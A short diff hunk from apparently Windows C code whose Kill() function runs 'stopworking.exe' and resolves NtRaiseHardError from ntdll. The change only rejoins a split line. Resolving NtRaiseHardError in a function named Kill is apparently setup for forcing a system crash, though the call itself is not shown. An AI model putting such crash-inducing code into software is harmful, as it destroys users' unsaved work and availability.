@@ -48,8 +48,7 @@ void Kill(){
 	system("stopworking.exe");
 	UNICODE_STRING str;
     HMODULE hDll = GetModuleHandle(TEXT("ntdll.dll"));
-    type_NtRaiseHardError NtRaiseHardError = (type_NtRaiseHardEr
-ror)GetProcAddress(hDll, "NtRaiseHardError");
+    type_NtRaiseHardError NtRaiseHardError = (type_NtRaiseHardError)GetProcAddress(hDll, "NtRaiseHardError");
  	type_RtlInitUnicodeString RtlInitUnicodeString = (type_RtlInitUnicodeString)GetProcAddress(hDll, "RtlInitUnicodeString");
  	
         // 31 chars
